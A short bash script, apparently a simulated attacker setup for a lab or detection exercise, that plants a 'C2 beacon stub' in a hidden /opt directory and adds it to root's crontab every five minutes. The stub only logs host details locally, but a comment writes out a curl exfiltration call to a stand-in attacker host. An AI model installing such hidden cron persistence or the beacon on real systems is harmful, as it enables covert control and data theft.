#!/bin/bash
# Create hidden directory and beacon script
mkdir -p /opt/.hidden
cat > /opt/.hidden/beacon.sh << 'EOF'
#!/bin/bash
# C2 beacon stub — simulates data exfiltration
HOSTNAME=$(hostname)
IP=$(hostname -I | awk '{print $1}')
UPTIME=$(uptime -p)
echo "$(date): beacon from ${HOSTNAME} (${IP}) - ${UPTIME}" >> /opt/.hidden/beacon.log
# Real beacon would: curl -s https://c2.attacker.example/beacon -d "host=${HOSTNAME}&ip=${IP}"
EOF
chmod 755 /opt/.hidden/beacon.sh

# Add to root crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /opt/.hidden/beacon.sh") | crontab -
